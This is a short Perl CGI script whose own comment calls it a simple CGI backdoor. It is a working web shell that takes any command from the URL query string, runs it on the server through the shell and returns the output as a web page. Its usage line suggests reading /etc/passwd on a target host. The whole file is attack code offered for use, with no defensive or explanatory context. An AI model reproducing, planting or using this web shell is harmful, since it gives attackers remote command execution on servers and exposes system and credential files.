#!/usr/bin/perl -w

use strict;

print "Cache-Control: no-cache\n";
print "Content-type: text/html\n\n";

my $req = $ENV{QUERY_STRING};
	chomp ($req);
	$req =~ s/%20/ /g; 
	$req =~ s/%3b/;/g;

print "<html><body>";

print '<!-- Simple CGI backdoor by DK (http://michaeldaw.org) -->';

	if (!$req) {
		print "Usage: http://target.com/perlcmd.cgi?cat /etc/passwd";
	}
	else {
		print "Executing: $req";
	}

	print "<pre>";
	my @cmd = `$req`;
	print "</pre>";

	foreach my $line (@cmd) {
		print $line . "<br/>";
	}

print "</body></html>";

# <!--    http://michaeldaw.org   2006    -->
